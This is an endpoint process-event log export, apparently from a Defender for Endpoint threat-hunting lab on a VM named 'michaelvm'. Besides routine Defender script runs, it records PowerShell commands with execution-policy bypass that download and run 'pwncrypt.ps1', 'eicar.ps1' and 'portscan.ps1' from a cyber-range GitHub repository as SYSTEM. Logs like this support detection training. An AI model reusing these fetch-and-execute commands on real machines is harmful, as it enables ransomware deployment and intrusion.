Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,ProcessVersionInfoCompanyName,ProcessVersionInfoProductName,ProcessVersionInfoProductVersion,ProcessVersionInfoInternalFileName,ProcessVersionInfoOriginalFileName,ProcessVersionInfoFileDescription,ProcessId,ProcessCommandLine,ProcessIntegrityLevel,ProcessTokenElevation,ProcessCreationTime,AccountDomain,AccountName,AccountSid,AccountUpn,AccountObjectId,LogonId,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessAccountUpn,InitiatingProcessAccountObjectId,InitiatingProcessLogonId,InitiatingProcessIntegrityLevel,InitiatingProcessTokenElevation,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessFolderPath,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessSignerType,InitiatingProcessSignatureStatus,ReportId,AppGuardContainerId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionDeviceName,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,ProcessUniqueId,InitiatingProcessUniqueId
"Jun 17, 2025 3:22:58 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,2056,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9e137068-a631-45e6-81aa-4adda242796e.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9e137068-a631-45e6-81aa-4adda242796e.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '9cb71f70f9eabd58bb1f9dbb841dd4c71ba2fb3d2180b2f958875dc9eeadecd5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9e137068-a631-45e6-81aa-4adda242796e.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 3:22:58 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,8036,"""SenseIR.exe"" ""OfflineSenseIR"" ""1512"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6NDAwOH0=""","Jun 17, 2025 3:22:48 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,11850,,,0,0,,,0,0,,,2814749767115636,2814749767115629
"Jun 17, 2025 5:12:32 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7336,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'd7a658288ffc136a83692b92ee05a6f6a5a8dad3020af48a04c4a3274f140883')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 5:12:32 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,3636,"""SenseIR.exe"" ""OfflineSenseIR"" ""996"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk0OH0=""","Jun 17, 2025 5:12:22 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,12431,,,0,0,,,0,0,,,2814749767117147,2814749767117144
"Jun 17, 2025 5:53:02 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,2184,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '420e8a8811873976aabed8aa7ac35735813707b91ab52e2f74f24d45dcb751eb')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 5:53:02 AM",nt authority,local service,S-1-5-19,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,6768,"""SenseIR.exe"" ""OfflineSenseIR"" ""1100"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6OTkyfQ==""","Jun 17, 2025 5:52:52 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,12560,,,0,0,,,0,0,,,2814749767117709,2814749767117705
"Jun 17, 2025 6:13:31 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,2104,powershell  -ExecutionPolicy Unrestricted -File script31.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:13:31 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,668,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script31.ps1","Jun 17, 2025 6:13:31 AM",c:\windows\system32\cmd.exe,8644,RunCommandExtension.exe,"Jun 17, 2025 6:13:31 AM",OsVendor,Valid,12763,,,0,0,,,0,0,,,2814749767117997,2814749767117995
"Jun 17, 2025 6:13:33 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6872,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:13:33 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8752,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1","Jun 17, 2025 6:13:32 AM",c:\windows\system32\cmd.exe,2104,powershell.exe,"Jun 17, 2025 6:13:31 AM",OsVendor,Valid,12765,,,0,0,,,0,0,,,2814749767118001,2814749767118000
"Jun 17, 2025 6:13:36 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8760,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:13:36 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7204,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1","Jun 17, 2025 6:13:36 AM",c:\windows\system32\cmd.exe,2104,powershell.exe,"Jun 17, 2025 6:13:31 AM",OsVendor,Valid,12776,,,0,0,,,0,0,,,2814749767118003,2814749767118002
"Jun 17, 2025 6:16:15 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4932,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '671d163865ed6e6f4e6d40478bb315ec3cc97bda75d315a31e012fb17beffb50')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 6:16:15 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,1704,"""SenseIR.exe"" ""OfflineSenseIR"" ""3480"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MTEwNH0=""","Jun 17, 2025 6:16:05 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,12801,,,0,0,,,0,0,,,2814749767118039,2814749767118036
"Jun 17, 2025 6:25:36 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8836,powershell  -ExecutionPolicy Unrestricted -File script32.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:25:36 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,9184,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script32.ps1","Jun 17, 2025 6:25:36 AM",c:\windows\system32\cmd.exe,1916,RunCommandExtension.exe,"Jun 17, 2025 6:25:36 AM",OsVendor,Valid,12848,,,0,0,,,0,0,,,2814749767118174,2814749767118171
"Jun 17, 2025 6:25:37 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6424,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:25:37 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8848,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1","Jun 17, 2025 6:25:37 AM",c:\windows\system32\cmd.exe,8836,powershell.exe,"Jun 17, 2025 6:25:36 AM",OsVendor,Valid,12850,,,0,0,,,0,0,,,2814749767118176,2814749767118175
"Jun 17, 2025 6:25:42 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8704,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:25:41 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4376,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1","Jun 17, 2025 6:25:41 AM",c:\windows\system32\cmd.exe,8836,powershell.exe,"Jun 17, 2025 6:25:36 AM",OsVendor,Valid,12854,,,0,0,,,0,0,,,2814749767118180,2814749767118179
"Jun 17, 2025 6:37:32 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7372,powershell  -ExecutionPolicy Unrestricted -File script33.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:37:32 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,1016,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script33.ps1","Jun 17, 2025 6:37:32 AM",c:\windows\system32\cmd.exe,8756,RunCommandExtension.exe,"Jun 17, 2025 6:37:32 AM",OsVendor,Valid,12965,,,0,0,,,0,0,,,2814749767118375,2814749767118373
"Jun 17, 2025 6:37:33 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,772,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 6:37:33 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8596,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1","Jun 17, 2025 6:37:33 AM",c:\windows\system32\cmd.exe,7372,powershell.exe,"Jun 17, 2025 6:37:32 AM",OsVendor,Valid,12967,,,0,0,,,0,0,,,2814749767118377,2814749767118376
